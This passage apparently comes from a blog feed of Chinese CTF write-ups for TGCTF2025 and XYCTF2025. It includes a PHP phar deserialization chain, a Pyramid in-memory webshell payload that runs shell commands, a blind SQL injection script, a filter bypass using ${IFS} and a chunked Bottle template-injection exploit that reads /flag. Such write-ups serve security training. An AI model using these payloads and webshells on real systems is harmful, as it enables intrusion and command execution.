class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="number">0</span>,-<span class="number">4</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64</span>(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// You learn yesterday, you choose today, can you get to your future?</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里是用phar做到反序列化，可以看到这里用了存在漏洞的file_exists函数。</p><p>构造链子的方式大体与上题一致。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">future</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由此生成phar.phar文件，将后缀名改为.atg，然后上传</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250416200453131.png" alt="image-20250416200453131"></p><p>利用phar协议不看后缀名的特性，在filename处触发反序列化，post传参wow执行命令，这次flag在环境变量里</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250416200818751.png" alt="image-20250416200818751"></p><h4 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h4><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.view <span class="keyword">import</span> view_config</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> pyramid.events <span class="keyword">import</span> NewResponse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, BaseLoader</span><br><span class="line"></span><br><span class="line">eval_globals = &#123; <span class="comment">#防止eval执行恶意代码</span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="comment"># 禁用所有内置函数</span></span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>: <span class="literal">None</span>       <span class="comment"># 禁止动态导入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    expr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        expr_input = request.POST[<span class="string">&#x27;expr&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> checkExpr(expr_input):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(expr_input, eval_globals)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                result = e</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;爬！&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"></span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    <span class="keyword">return</span> Response(rendered)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"></span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9040</span>, app)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<a href="https://xz.aliyun.com/news/16090?u_atoken=87dba66839b39d2b13eae6e4583416ca&u_asig=0a47309317440258787906072e00fe">这篇文章</a>写入pyramid框架的内存马</p><p>payload</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.add_route(&#x27;shell&#x27;, &#x27;/shell&#x27;);config.add_view(lambda request:Response(__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;1&#x27;)).read()),route_name=&#x27;shell&#x27;);app = config.make_wsgi_app()</span><br></pre></td></tr></table></figure><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250418170240811.png" alt="image-20250418170240811"></p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250418170307560.png" alt="image-20250418170307560"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> TGCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025 Writeup</title>
      <link href="/posts/359b65ed/"/>
      <url>/posts/359b65ed/</url>
      
        <content type="html"><![CDATA[<blockquote><p>仍然是没有web没有pwn，全靠其他方向硬抗((</p></blockquote><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/XYCTF2025Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>w8nn9z</strong>, <strong>1n1t</strong>, <strong>Hibiscus</strong>.</p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="sins"><a href="#sins" class="headerlink" title="sins"></a>sins</h4><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里对我们输入的要求是：</p><p>1.lambda定义的函数要相当于i_pow函数</p><p>2.输入的字符必须在i0123456789+-*%&#x2F;^&#x3D;&lt;&gt;~&amp;|:()[]’之中</p><p>3.输入的长度必须不能长于16</p><p>问ai以后可以知道这边可以使用字符串的切片，后续再修改一下，可以得到如下包含对输入进行模运算且步长为2的切片方法：</p><p>‘1i–’[i&amp;3::-2]</p><p>长度是15，刚好够得到flag</p><h4 id="喜欢就说出来"><a href="#喜欢就说出来" class="headerlink" title="喜欢就说出来"></a>喜欢就说出来</h4><p>翻看流量，能找到传输了一张png</p><p><img src="/images/XYCTF2025-Writeup/1744094465729-4a784336-db67-46e8-89c7-1bb1d763cd30.png" alt="img"></p><p>提取出来，发现这个png不大正常，有两个IHDR头</p><p><img src="/images/XYCTF2025-Writeup/1744094760958-b159cb5f-3377-40b6-b6a2-f9067e0aded2.png" alt="img"></p><p>发现主要有两种长度的IDAT数据块，将其分类得到两张图片，然后再稍稍调整一下IDAT块的顺序让两张图片都显示完全</p><p><img src="/images/XYCTF2025-Writeup/1744095645618-6ee8e557-3467-4d21-a5fb-bbced69a4a7a.png" alt="img"></p><p>在其中一张图片中就有半个flag</p><p><img src="/images/XYCTF2025-Writeup/1744095682900-9cab34b0-40ab-4761-a015-00f247090765.png" alt="img"></p><p>接下来就是脑洞时间，这道题的题目描述是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小Shark在上课时和自己的暗恋对象坐在了一起，小Shark想要把悄悄话和文件传给同桌，可惜小Shark没有移动硬盘，不过这难不住聪明的小Shark，小Shark在同桌的电脑上敲了几下键盘，用自己的浏览器给同桌试传了两张自己的照片和一句悄悄话，你能发现小Shark对同桌说了什么吗？会不会是......520?!呢? </span><br></pre></td></tr></table></figure><p>所以类似lsb的操作，提取R&#x3D;5, G&#x3D;2, B&#x3D;0这样三个通道的数据得到后半个flag</p><p><img src="/images/XYCTF2025-Writeup/1744095913481-8de029a8-dc06-4c69-ab55-7f75ab6c34a7.png" alt="img"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h4><p>先用万能密码就能进入到第二个页面，发现需要管理员密码</p><p><img src="/images/XYCTF2025-Writeup/image-20250409164415401.png" alt="image-20250409164415401"></p><p><img src="/images/XYCTF2025-Writeup/image-20250409164433854.png" alt="image-20250409164433854"></p><p>仍然去第一个页面进行布尔盲注，注出第二个页面的密码。其中发现username处有过滤，password没有，因此注password:)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line"><span class="comment">#SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database()</span></span><br><span class="line"><span class="comment">#SELECT secret FROM double_check</span></span><br><span class="line">wrong_code = <span class="string">&#x27;帐号或密码错误&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    min_num = <span class="number">32</span></span><br><span class="line">    max_num = <span class="number">128</span></span><br><span class="line">    mid_num = (min_num + max_num) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> min_num &lt; max_num:</span><br><span class="line">        payload = <span class="string">&quot;or(ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + exp + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(num, mid_num)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> wrong_code <span class="keyword">in</span> result.text:</span><br><span class="line">                max_num = mid_num</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                min_num = mid_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        mid_num = (min_num + max_num) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid_num &lt;= <span class="number">32</span> <span class="keyword">or</span> mid_num &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid_num) </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/images/XYCTF2025-Writeup/image-20250409205441709.png" alt="image-20250409205441709"></p><p><img src="/images/XYCTF2025-Writeup/image-20250409211907225.png" alt="image-20250409211907225"></p><p>后面可以猜测字段名就是第二个页面要传的参数名secret</p><p><img src="/images/XYCTF2025-Writeup/image-20250409214302645.png" alt="image-20250409214302645"></p><p>进入后续页面发现过滤了空格，这里用${IFS}绕过即可。</p><p>把命令执行的结果重定向到文件中即可</p><img src="/images/XYCTF2025-Writeup/image-20250409215112532.png" alt="image-20250409215112532" style="zoom:50%;" /><img src="/images/XYCTF2025-Writeup/image-20250409215132186.png" alt="image-20250409215132186" style="zoom:50%;" /><img src="/images/XYCTF2025-Writeup/image-20250409215201850.png" alt="image-20250409215201850" style="zoom:50%;" /><p><img src="/images/XYCTF2025-Writeup/image-20250409215247739.png" alt="image-20250409215247739"></p><h4 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h4><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>此处是一个bottle的模板注入，但是限制了payload的长度要小于25。实际上只要把它拆成很多小段塞到一个值里面去，然后一下子执行就好了。</p><p>官方给出的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">3</span>)]</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">    r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/XYCTF2025-Writeup/image-20250409201805824.png" alt="image-20250409201805824"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2025 Misc 招新题 x1cbank Official Writeup（需要密码）</title>
      <link href="/posts/73977bd5/"/>
      <url>/posts/73977bd5/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2e099e26c32eab2749b8af7d7d55244e8fad398f818e3e551e5d668b7b716b4d">ec939b3b76cf4f8afa9bb4e653fe26987601c1591c52157d9a87503071b6c855750c52c35c197f1459480a17e052bafcf4d751bdac850621c5d0a45f54d2a457840758f5e00447f795ae81a62e302b0efb2a89998a600f548279a7847a8835a7996637db1a938ad90b671a60f594e8889f1981407f65e1da62c9a92b173298ef432bd76552c635305e7d996735c35a14d3741c82080fce903496e66fdfdc4cd54fac214dc5869fe2745872af49dc5680d4e8ca58d2d906f5f9b4190c594a45952d676300752c3fae9018dcc7609e0b861f5f43f4f835745163e6368111e190e73eb2105973d0a1e9e6db55415512adfd85142e83cb2b8df194fbca1e46ac61d49715cab23bb562448eda76bbca873715b203bb59b7077116fefd73c3219f86426074944f468267ec95a57bd909d160cb977f1788fac823c48a2aa77b795f59578fd8fbda6bfcb20b67615fd12820daa6fb5d0dce2ee32c86f26e81bc617c8851cf071f2d358f017cab3e329df17133f8593c786f7c68479c27726f8785eb19f74155111302b412eba4c7cc0f4f9e6e6ce7b93fa547d19fa2816e4cb2243db195b6307ed712f37758199b2c2e0f2e0f356a2bb825d0059446595b444cdc48ba02e8454f13c8e1e6540773ee95ab41fc9ce5b35244fe53bb081b04c8a4d8111103916862551bff622ac055e26ba1ab4b178db48ef46a867e28bdc02370cd107f921c936e8fff8c7d49dfd1dedbb04bc77e4a0a705b36ba385306875c0a141a3d5996bbabf66b42ec210a1a253519848cea84b018f49c11c989f3d033c41e0d39ef9516900378d7bee373e6ec55c15da185799c34469cb7c5c1f879b07587d8be9e8239e1b54cbde4cb754f82979afa616e77b0047e618044493f005276345326f51a6264c777c3680a75e0dc9e59930a8f4f87cea7c496593ff33eb245302528b5f08006a6ab3339851d84b2f9de31c47b145ca63f5f03a2190ee99154cc4e7ae3ca1ec35c1b0b138a7ad8b0b9aba42f3c784a03b3b0d883bda97ea22a5b7cba2f7b63ae8b199bc15180f85a53ce17bcded4690d7bedd54e3285156925905b00b13fd58dca5603e0a7c181619d3440b45256e3a42b13a810c905d854019c42a961b6bf485f54548dfcec51684946617e58cae40c27f651d96657fecdc706ceab309f17919c43cac2